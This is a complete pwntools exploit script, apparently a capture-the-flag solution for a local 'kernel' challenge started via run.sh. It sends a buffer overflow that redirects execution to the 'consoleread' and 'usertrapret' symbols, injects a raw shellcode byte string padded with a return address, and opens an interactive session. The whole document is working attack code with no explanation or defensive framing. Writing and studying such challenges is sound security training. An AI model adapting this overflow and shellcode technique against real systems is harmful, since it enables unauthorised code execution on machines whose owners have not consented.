from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'

r = process("./run.sh")

elf = ELF("kernel", checksec=False)

shellcode = b"\x9d\x64\x9b\x84\x34\x87\x23\x3c\x91\xfe\x23\x30\x91\xfe\x23\x38\x01\xfe\x13\x05\x01\xfe\x23\x34\xa1\xfe\x13\x05\x81\xff\x93\x05\x81\xfe\x9d\x48\x73\x00\x00\x00"

payload = b'a'*0x28 + p64(elf.sym['consoleread']+6)
payload += b'a'*0x28 + p64(elf.sym['usertrapret'])

r.sendlineafter("send?\n", str(0xc0))
r.sendlineafter("input\n", payload)

payload = shellcode.ljust(0x90, b'a')
payload += p64(0x2f28)

r.recvuntil("\x00\x00\x00\x00\n")
r.send(payload[:0x80])
sleep(0.5)
r.sendline(payload[0x80:])

r.interactive()
